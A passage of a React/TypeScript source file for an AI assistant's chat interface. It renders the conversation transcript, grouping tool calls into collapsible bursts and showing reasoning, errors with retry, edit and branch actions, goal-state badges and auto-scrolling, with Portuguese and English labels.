    </div>
  );
});

type ToolRenderItem =
  | { kind: "single"; tool: ToolRow; index: number }
  | { kind: "burst"; items: { tool: ToolRow; index: number }[] };

function groupTools(tools: ToolRow[]): ToolRenderItem[] {
  const out: ToolRenderItem[] = [];
  let i = 0;
  while (i < tools.length) {
    if (tools[i].ok === true && BURST_READ_TOOLS.has(tools[i].name)) {
      const run: { tool: ToolRow; index: number }[] = [];
      while (i < tools.length && tools[i].ok === true && BURST_READ_TOOLS.has(tools[i].name)) {
        run.push({ tool: tools[i], index: i });
        i += 1;
      }
      if (run.length >= 3) {
        out.push({ kind: "burst", items: run });
      } else {
        for (const r of run) out.push({ kind: "single", tool: r.tool, index: r.index });
      }
    } else {
      out.push({ kind: "single", tool: tools[i], index: i });
      i += 1;
    }
  }
  return out;
}

const ToolBurstGroup = memo(function ToolBurstGroup({
  items,
  sessionId,
}: {
  items: { tool: ToolRow; index: number }[];
  sessionId?: string | null;
}) {
  const lang = useLang();
  const [open, setOpen] = useState(false);
  const summary = useMemo(() => {
    const names: string[] = [];
    for (const { tool } of items) {
      const p = parseArgs(tool.args);
      const o = p && typeof p === "object" ? (p as Record<string, unknown>) : null;
      const raw =
        (typeof o?.pattern === "string" && o.pattern) ||
        (typeof o?.query === "string" && o.query) ||
        (typeof o?.path === "string" && o.path) ||
        (typeof o?.file_path === "string" && o.file_path) ||
        (typeof o?.filePath === "string" && o.filePath) ||
        "";
      const short = raw ? (raw.split(/[\\/]/).pop() ?? raw) : tool.name;
      if (short && !names.includes(short)) names.push(short);
      if (names.length >= 3) break;
    }
    const extra = items.length - names.length;
    return names.length
      ? names.join(", ") + (extra > 0 ? ` +${extra}` : "")
      : "";
  }, [items]);

  return (
    <div className={"tool-burst" + (open ? " open" : "")}>
      <button
        type="button"
        className="tool-burst-head"
        aria-expanded={open}
        onClick={() => setOpen((v) => !v)}
      >
        <span className="tool-icon">
          <Search size={14} strokeWidth={2} />
        </span>
        <span className="tool-name">
          {tr(lang, `Explorou ${items.length} itens`, `Explored ${items.length} items`)}
        </span>
        {summary ? (
          <span className="tool-arg" title={summary}>
            {summary}
          </span>
        ) : (
          <span className="spacer" />
        )}
        <span className="tool-state" aria-hidden>
          <Check size={14} strokeWidth={2.25} />
        </span>
        <ChevronRight size={14} strokeWidth={2} className="chev" />
      </button>
      {open ? (
        <div className="tool-burst-body">
          {items.map(({ tool, index }) => (
            <ToolLine key={`${tool.id}-${index}`} row={tool} sessionId={sessionId} />
          ))}
        </div>
      ) : null}
    </div>
  );
});

const AssistantBlock = memo(function AssistantBlock(props: {
  block: Block & { kind: "assistant" };
  sessionId?: string | null;
  onBranch?: (id: number) => void;
  /** Resends the last prompt (only on the newest failed answer). */
  onRetry?: () => void;
}) {
  const lang = useLang();
  const [showReasoning, setShowReasoning] = useState(false);
  const b = props.block;
  const toolGroups = useMemo(() => groupTools(b.tools), [b.tools]);
  const thinking = b.streaming && !b.text && b.tools.length === 0;
  return (
    <div className="msg-assistant">
      <span className="msg-avatar">
        <ZerithMark size={24} />
      </span>
      <div className="msg-body">
        {b.reasoning ? (
          <div className={"think" + (showReasoning ? " open" : "") + (thinking ? " live" : "")}>
            <button className="think-head" onClick={() => setShowReasoning(!showReasoning)} aria-expanded={showReasoning}>
              <Brain size={14} strokeWidth={2} />
              <span className="think-label">{thinking ? "Pensando…" : "Raciocínio"}</span>
              <ChevronRight size={14} strokeWidth={2} className="chev" />
            </button>
            {showReasoning ? (
              <div className="think-body">
                <Markdown text={b.reasoning} streaming={b.streaming && !b.text} />
              </div>
            ) : null}
          </div>
        ) : null}
        {b.tools.length > 0 ? (
          <div className="tools">
            {toolGroups.map((g, gIdx) =>
              g.kind === "burst" ? (
                <ToolBurstGroup
                  key={`burst-${g.items[0].tool.id}-${g.items[0].index}-${gIdx}`}
                  items={g.items}
                  sessionId={props.sessionId}
                />
              ) : (
                <ToolLine key={`${g.tool.id}-${g.index}`} row={g.tool} sessionId={props.sessionId} />
              ),
            )}
          </div>
        ) : null}
        {b.text ? (
          <Markdown text={b.text} streaming={b.streaming} />
        ) : thinking && !b.reasoning ? (
          <span className="thinking-live" role="status">
            <Brain size={14} strokeWidth={2} />
            <span className="think-label">Pensando…</span>
          </span>
        ) : null}
        {b.error ? (
          <div className="callout danger" role="alert">
            <AlertTriangle size={16} strokeWidth={1.75} />
            <div>
              <strong>A resposta não terminou</strong>
              <p>{b.error}</p>
              {props.onRetry ? (
                <button type="button" className="btn btn-sm" onClick={props.onRetry}>
                  Tentar de novo
                </button>
              ) : null}
            </div>
          </div>
        ) : null}
        {props.sessionId && b.stored && !b.streaming ? (
          <TurnChanges sessionId={props.sessionId} messageId={b.stored} />
        ) : null}
        {b.text && !b.streaming ? (
          <div className="msg-actions">
            <CopyButton text={b.text} label={tr(lang, "Copiar", "Copy")} />
            {props.onBranch && b.stored ? (
              <button
                className="copy-btn"
                onClick={() => props.onBranch!(b.stored!)}
                aria-label="Ramificar daqui"
                title="Ramificar daqui: nova conversa com tudo até esta resposta"
              >
                <GitBranch size={14} strokeWidth={2} />
                <span>Ramificar daqui</span>
              </button>
            ) : null}
          </div>
        ) : null}
      </div>
    </div>
  );
});


/** One prompt, with its attached images and its "Editar" action. Memoised: it
 * never changes while the answer below it streams. */
const UserRow = memo(function UserRow(props: {
  block: Block & { kind: "user" };
  onEdit?: (id: number, text: string) => void;
}) {
  const lang = useLang();
  const b = props.block;
  const onEdit = props.onEdit;
  // Attached images arrive as `![nome](<path>)` lines (Composer).
  const imgs = useMemo(() => [...b.text.matchAll(USER_IMG)], [b.text]);
  const text = imgs.length ? b.text.replace(USER_IMG, "").trim() : b.text;
  // Mensagem longa (mais de 12 linhas) começa dobrada em 8, com "Mostrar tudo".
  const long = useMemo(() => text.split("\n").length > 12, [text]);
  const [expanded, setExpanded] = useState(false);
  const bodyId = useId();
  const folded = long && !expanded;
  return (
    <div className="msg-user-row">
      <div className="msg-user">
        {imgs.length ? (
          <div className="msg-user-imgs">
            {imgs.map((m, j) => (
              <MdImage key={j} src={m[2]} alt={m[1]} />
            ))}
          </div>
        ) : null}
        {text ? (
          <div id={bodyId} className={"msg-user-text" + (folded ? " folded" : "")}>
            <Markdown text={text} streaming={false} />
          </div>
        ) : null}
        {long ? (
          <button
            type="button"
            className="msg-user-more"
            aria-expanded={expanded}
            aria-controls={bodyId}
            onClick={() => setExpanded((v) => !v)}
          >
            <ChevronRight size={14} strokeWidth={2} className="chev" />
            {expanded ? "Mostrar menos" : "Mostrar tudo"}
          </button>
        ) : null}
      </div>
      <div className="msg-actions">
        <CopyButton text={text || b.text} label={tr(lang, "Copiar", "Copy")} />
        {onEdit && b.id != null ? (
          <button
            className="copy-btn"
            onClick={() => onEdit(b.id!, b.text)}
            aria-label="Editar"
            title="Editar: nova conversa a partir daqui com esta mensagem no campo"
          >
            <Pencil size={14} strokeWidth={2} />
            <span>Editar</span>
          </button>
        ) : null}
      </div>
    </div>
  );
});

function goalStateLabel(sub: string, lang: Lang): { label: string; tone: string } {
  switch (sub) {
    case "start":
      return { label: tr(lang, "objetivo", "goal"), tone: "accent" };
    case "continue":
      return { label: tr(lang, "continuando", "continuing"), tone: "" };
    case "done":
      return { label: tr(lang, "concluído", "done"), tone: "ok" };
    case "blocked":
      return { label: tr(lang, "bloqueado", "blocked"), tone: "warn" };
    case "cancelled":
      return { label: tr(lang, "cancelado", "cancelled"), tone: "" };
    case "failed":
      return { label: tr(lang, "falhou", "failed"), tone: "danger" };
    default:
      return { label: sub, tone: "" };
  }
}

export const Transcript = memo(function Transcript(props: {
  blocks: Block[];
  tail?: React.ReactNode;
  sessionId?: string | null;
  /** A turn is running: no edit/branch until it lands. */
  busy?: boolean;
  onEdit?: (id: number, text: string) => void;
  onBranch?: (id: number) => void;
  /** "Tentar de novo" on the newest failed answer. */
  onRetry?: () => void;
  /** Above the first block: history paging / load error. */
  head?: React.ReactNode;
}) {
  const lang = useLang();
  const box = useRef<HTMLDivElement>(null);
  const pinned = useRef(true);
  const scrollRafRef = useRef<number | null>(null);
  const [away, setAway] = useState(false);
  const onEdit = props.busy ? undefined : props.onEdit;
  const onBranch = props.busy ? undefined : props.onBranch;
  const onRetry = props.busy ? undefined : props.onRetry;
  let lastAssistant = -1;
  for (let i = props.blocks.length - 1; i >= 0; i--) {
    if (props.blocks[i].kind === "assistant") {
      lastAssistant = i;
      break;
    }
  }

  useEffect(() => {
    const el = box.current;
    if (!el) return;
    const onScroll = () => {
      pinned.current = el.scrollHeight - el.scrollTop - el.clientHeight < 80;
      setAway(!pinned.current);
    };
    el.addEventListener("scroll", onScroll, { passive: true });
    return () => el.removeEventListener("scroll", onScroll);
  }, []);

  // A prompt just sent: follow it even when the view was scrolled up.
  const userCount = props.blocks.reduce((n, b) => n + (b.kind === "user" ? 1 : 0), 0);
  const lastUserCount = useRef(userCount);
  if (userCount > lastUserCount.current) pinned.current = true;
  lastUserCount.current = userCount;

  // Scroll only the transcript: scrollIntoView would also move every
  // overflow:hidden ancestor (the sheet, the shell) and shift the layout.
  // Coalesce multiple calls per frame (blocks delta + ResizeObserver) into one rAF.
  const toEnd = useCallback(() => {
    if (!pinned.current || scrollRafRef.current !== null) return;
    scrollRafRef.current = requestAnimationFrame(() => {
      scrollRafRef.current = null;
      const el = box.current;
      if (el && pinned.current) el.scrollTop = el.scrollHeight;
    });
  }, []);

  useEffect(() => {
    toEnd();
  }, [props.blocks, props.tail, toEnd]);

  // An image that finishes loading grows the stack without a new block;
  // keep the view pinned to the bottom when it was there.
  useEffect(() => {
    const stack = box.current?.firstElementChild;
    if (!stack) return;
    const ro = new ResizeObserver(toEnd);
    ro.observe(stack);
    return () => {
      ro.disconnect();
      if (scrollRafRef.current !== null) {
        cancelAnimationFrame(scrollRafRef.current);
        scrollRafRef.current = null;
      }
    };
  }, [toEnd]);

  return (
    <div className="transcript-wrap">
      <div className="transcript" ref={box}>
        <div className="stack">
          {props.head}
          {props.blocks.length === 0 && !props.head ? (
            <div className="convo-empty">
              <ZerithMark size={32} />
              <p>Conversa vazia. Escreva abaixo para começar; use / para comandos e @ para citar arquivos.</p>
            </div>
          ) : null}
          {(() => {
            let aOrd = 0;
            let uOrd = 0;
            let nOrd = 0;
            const rendered = props.blocks.map((b, i) => {
              // A block the event did not touch keeps its reference, so `memo`
              // skips it: only the answer being written is re-rendered. Keying
              // by per-kind ordinal keeps keys stable across streaming→stored
              // transitions and borrowIds while preventing cross-kind collisions.
              if (b.kind === "user") {
                return <UserRow key={`u-${uOrd++}`} block={b} onEdit={onEdit} />;
              }
              if (b.kind === "subagent") {
                return <SubagentCard key={`sub-${b.id}`} block={b} />;
              }
              if (b.kind === "note" && b.btw) {
                return <BtwNote key={`btw-${b.btw.id}`} btw={b.btw} />;
              }
              if (b.kind === "note" && b.learned?.length) {
                return <LearnedNote key={`n-${nOrd++}`} text={b.text} items={b.learned} />;
              }
              if (b.kind === "note") {
                const goalBadge = b.sub ? goalStateLabel(b.sub, lang) : null;
                return (
                  <div key={`n-${nOrd++}`} className="msg-note">
                    <Info size={14} strokeWidth={2} />
                    {goalBadge ? (
                      <span className={"badge msg-note-badge" + (goalBadge.tone ? " " + goalBadge.tone : "")}>
                        {goalBadge.label}
                      </span>
                    ) : null}
                    <Markdown text={b.text} streaming={false} />
                  </div>
                );
              }
              return (
                <AssistantBlock
                  key={`a-${aOrd++}`}
                  block={b}
                  sessionId={props.sessionId}
                  onBranch={onBranch}
                  onRetry={i === lastAssistant && b.error ? onRetry : undefined}
                />
              );
            });
            return (
              <>
                {rendered}
                {/*
                  The answer block is born on the first event, so a slow turn used to
                  look frozen: the dots stand in for it while the turn is running.
                */}
                {props.busy && !props.blocks.some((b) => b.kind === "assistant" && b.streaming) ? (
                  <AssistantBlock
                    key={`a-${aOrd}`}
                    block={{ kind: "assistant", text: "", reasoning: "", tools: [], streaming: true }}
                    sessionId={props.sessionId}
                  />
                ) : null}
              </>
            );
          })()}
          {props.tail}
        </div>
      </div>
      {away ? (
        <button
          type="button"
          className="btn btn-sm transcript-end"
          onClick={() => {
            const el = box.current;
            if (!el) return;
            pinned.current = true;
            setAway(false);
            el.scrollTop = el.scrollHeight;
          }}
        >
          {tr(lang, "Ir para o fim", "Jump to bottom")}
        </button>
      ) : null}
    </div>
  );
});
